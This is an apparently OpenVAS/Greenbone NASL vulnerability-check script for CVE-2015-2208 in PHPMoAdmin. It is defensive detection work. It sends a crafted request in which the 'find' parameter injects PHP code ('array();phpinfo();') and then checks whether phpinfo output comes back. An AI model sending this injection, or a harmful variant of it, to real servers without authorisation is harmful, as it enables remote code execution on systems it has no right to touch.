if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.105230" );
	script_cve_id( "CVE-2015-2208" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_name( "PHPMoAdmin Unauthorized Remote Code Execution" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2015-03-04 09:46:19 +0100 (Wed, 04 Mar 2015)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/36251/" );
	script_tag( name: "impact", value: "Exploiting this issue will allow attackers to execute arbitrary code
  within the context of the affected application." );
	script_tag( name: "vuldetect", value: "Send a special crafted HTTP GET request and check the response" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "PHPMoAdmin is prone to a remote code-execution
  vulnerability because the application fails to sufficiently sanitize user-supplied input." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "exploit" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
files = make_list( "/moadmin.php",
	 "/wu-moadmin.php" );
for dir in nasl_make_list_unique( "/phpmoadmin", "/moadmin", "/wu-moadmin", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	for file in files {
		url = dir + file + "?db=admin&action=listRows&collection=fdsa&find=array();phpinfo();";
		if(http_vuln_check( port: port, url: url, pattern: "<title>phpinfo\\(\\)" )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

